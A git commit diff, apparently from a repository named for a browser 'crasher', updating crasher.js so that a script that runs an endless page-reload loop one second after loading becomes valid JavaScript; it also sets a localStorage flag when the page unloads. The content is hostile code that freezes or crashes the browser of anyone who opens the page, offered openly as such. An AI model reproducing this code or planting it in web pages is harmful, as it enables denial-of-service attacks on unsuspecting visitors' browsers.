eeb47c507314829226018bd991fd03b2ee5684c1
DeKrypt <52050537+dekrypted@users.noreply.github.com>
2022-02-26 11:51:25 -0500

    Update crasher.js

--- crasher.js
+++ crasher.js
@@ -1,8 +1,5 @@
 onbeforeunload = function(){localStorage.x=1};
 
-
-if 10 < 20{
-  setTimeout(function(){
-    while(1)location.reload(1)
-  }, 1000)
-}
+setTimeout(function(){
+  while(1)location.reload(1)
+}, 1000)
